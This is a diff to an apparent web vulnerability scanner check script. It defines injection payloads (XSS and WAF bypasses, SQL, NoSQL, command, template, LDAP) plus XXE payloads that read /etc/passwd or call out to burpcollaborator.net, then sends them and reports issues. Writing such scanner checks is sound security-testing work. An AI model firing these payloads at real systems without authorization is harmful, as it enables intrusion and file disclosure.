@@ -7,17 +7,17 @@ metadata:
 
 define:
     # Injection payloads that might come through third-party API responses
-    xss_payload_1 = '<script>alert("XSS")</script>'
-    xss_payload_2 = '<img src=x onerror=alert(1)>'
-    xss_payload_svg = '<svg onload=alert(1)>'
-    xss_payload_event = '" onfocus="alert(1)" autofocus="'
+    xss_payload_1 = "<script>alert(\"XSS\")</script>"
+    xss_payload_2 = "<img src=x onerror=alert(1)>"
+    xss_payload_svg = "<svg onload=alert(1)>"
+    xss_payload_event = "\" onfocus=\"alert(1)\" autofocus=\""
     # WAF bypass XSS
-    xss_waf_bypass_1 = '<scr<script>ipt>alert(1)</scr</script>ipt>'
-    xss_waf_bypass_2 = '<SCRIPT>alert(1)</SCRIPT>'
-    xss_waf_bypass_3 = '"><img/src=x onerror=alert(1)>'
+    xss_waf_bypass_1 = "<scr<script>ipt>alert(1)</scr</script>ipt>"
+    xss_waf_bypass_2 = "<SCRIPT>alert(1)</SCRIPT>"
+    xss_waf_bypass_3 = "\"><img/src=x onerror=alert(1)>"
     xss_waf_bypass_4 = "javascript:alert(1)"
-    xss_waf_bypass_5 = '<details open ontoggle=alert(1)>'
-    xss_waf_bypass_unicode = '<script>al\u0065rt(1)</script>'
+    xss_waf_bypass_5 = "<details open ontoggle=alert(1)>"
+    xss_waf_bypass_unicode = "<script>al\u0065rt(1)</script>"
     # SQL Injection via third-party data
     sqli_payload_1 = "' OR '1'='1"
     sqli_payload_2 = "1' UNION SELECT null,null,null--"
@@ -30,9 +30,9 @@ define:
     sqli_waf_bypass_4 = "1'||'1'='1"
     sqli_waf_bypass_case = "1' uNiOn SeLeCt null--"
     # NoSQL Injection
-    nosql_payload_1 = '{"$gt":""}'
-    nosql_payload_2 = '{"$ne":null}'
-    nosql_payload_3 = '{"$regex":".*"}'
+    nosql_payload_1 = "{\"$gt\":\"\"}"
+    nosql_payload_2 = "{\"$ne\":null}"
+    nosql_payload_3 = "{\"$regex\":\".*\"}"
     # Command injection via third-party input
     cmdi_payload_1 = "; id"
     cmdi_payload_2 = "| id"
@@ -49,8 +49,8 @@ define:
     ssti_payload_3 = "#{7*7}"
     ssti_payload_jinja = "{{config.items()}}"
     # XXE via third-party XML
-    xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'
-    xxe_oob = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net/xxe">%xxe;]><root>test</root>'
+    xxe_payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>"
+    xxe_oob = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://burpcollaborator.net/xxe\">%xxe;]><root>test</root>"
     # LDAP injection
     ldap_payload_1 = "*)(&"
     ldap_payload_2 = "*)(objectClass=*"
@@ -73,7 +73,7 @@ given request then
                 replacing method: {base.request.method}
                 replacing query_string: {regex_replace({base.request.url.query}, "([^=]+=)[^&]*", `$1{xss_payload_1}`)}
 
-            if {xss_check_1.response.body} matches "<script>alert\\(\"XSS\"\\)</script>" then
+            if {xss_check_1.response.body} matches "<script>alert\(\"XSS\"\)</script>" then
                 report issue:
                     severity: high
                     confidence: firm
@@ -115,7 +115,7 @@ given request then
                     replacing method: {base.request.method}
                     replacing body: {regex_replace({base.request.body}, "\"[^\"]+\"\\s*:\\s*\"[^\"]*\"", `"test":"<script>alert(1)</script>"`)}
 
-                if {xss_body.response.body} matches "<script>alert\\(1\\)</script>" then
+                if {xss_body.response.body} matches "<script>alert\(1\)</script>" then
                     report issue:
                         severity: high
                         confidence: firm
@@ -146,8 +146,8 @@ given request then
                 replacing method: {base.request.method}
                 replacing query_string: {regex_replace({base.request.url.query}, "([^=]+=)[^&]*", `$1{sqli_payload_2}`)}
 
-            if {sqli_union.response.status_code} is 200 then
-                if {sqli_union.response.body} differs from {base.response.body} then
+            if {sqli_union.response.status_code} is "200" then
+                if {sqli_union.response} differs from {base.response} then
                     if not({sqli_union.response.body} matches "(error|invalid|bad request)") then
                         report issue:
                             severity: high
@@ -163,8 +163,8 @@ given request then
                 replacing method: {base.request.method}
                 replacing query_string: {regex_replace({base.request.url.query}, "([^=]+=)[^&]*", `$1{sqli_waf_bypass_1}`)}
 
-            if {sqli_waf_1.response.status_code} is 200 then
-                if {sqli_waf_1.response.body} differs from {base.response.body} then
+            if {sqli_waf_1.response.status_code} is "200" then
+                if {sqli_waf_1.response} differs from {base.response} then
                     if not({sqli_waf_1.response.body} matches "(error|invalid|blocked|forbidden)") then
                         report issue:
                             severity: high
@@ -180,8 +180,8 @@ given request then
                 replacing method: {base.request.method}
                 replacing query_string: {regex_replace({base.request.url.query}, "([^=]+=)[^&]*", `$1{sqli_waf_bypass_case}`)}
 
-            if {sqli_waf_case.response.status_code} is 200 then
-                if {sqli_waf_case.response.body} differs from {base.response.body} then
+            if {sqli_waf_case.response.status_code} is "200" then
+                if {sqli_waf_case.response} differs from {base.response} then
                     report issue:
                         severity: high
                         confidence: tentative
@@ -195,8 +195,8 @@ given request then
                 replacing method: {base.request.method}
                 replacing query_string: {regex_replace({base.request.url.query}, "([^=]+=)[^&]*", `$1{sqli_waf_bypass_3}`)}
 
-            if {sqli_waf_newline.response.status_code} is 200 then
-                if {sqli_waf_newline.response.body} differs from {base.response.body} then
+            if {sqli_waf_newline.response.status_code} is "200" then
+                if {sqli_waf_newline.response} differs from {base.response} then
                     report issue:
                         severity: high
                         confidence: tentative
@@ -230,9 +230,9 @@ given request then
             if {base.request.headers} matches "application/json" then
                 send request called nosql_check:
                     replacing method: {base.request.method}
-                    replacing body: {regex_replace({base.request.body}, "\"[^\"]+\"\\s*:\\s*\"[^\"]*\"", `"username":{"$gt":""},"password":{"$gt":""}`)}
+                    replacing body: {regex_replace({base.request.body}, "\"[^\"]+\"\\s*:\\s*\"[^\"]*\"", "\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}")}
 
-                if {nosql_check.response.status_code} is 200 then
+                if {nosql_check.response.status_code} is "200" then
                     if {nosql_check.response.body} matches "(token|session|user|auth|login|success)" then
                         report issue:
                             severity: high
@@ -245,9 +245,9 @@ given request then
                 # $regex injection
                 send request called nosql_regex:
                     replacing method: {base.request.method}
-                    replacing body: {regex_replace({base.request.body}, "\"[^\"]+\"\\s*:\\s*\"[^\"]*\"", `"username":{"$regex":".*"}`)}
+                    replacing body: {regex_replace({base.request.body}, "\"[^\"]+\"\\s*:\\s*\"[^\"]*\"", "\"username\":{\"$regex\":\".*\"}")}
 
-                if {nosql_regex.response.status_code} is 200 then
+                if {nosql_regex.response.status_code} is "200" then
                     report issue:
                         severity: high
                         confidence: tentative
@@ -433,8 +433,8 @@ given request then
                 replacing method: {base.request.method}
                 replacing query_string: {regex_replace({base.request.url.query}, "(user|search|lookup|query|find|uid)=[^&]+", `$1={ldap_payload_2}`)}
 
-            if {ldap_check.response.status_code} is 200 then
-                if {ldap_check.response.body} differs from {base.response.body} then
+            if {ldap_check.response.status_code} is "200" then
+                if {ldap_check.response} differs from {base.response} then
                     report issue:
                         severity: high
                         confidence: tentative
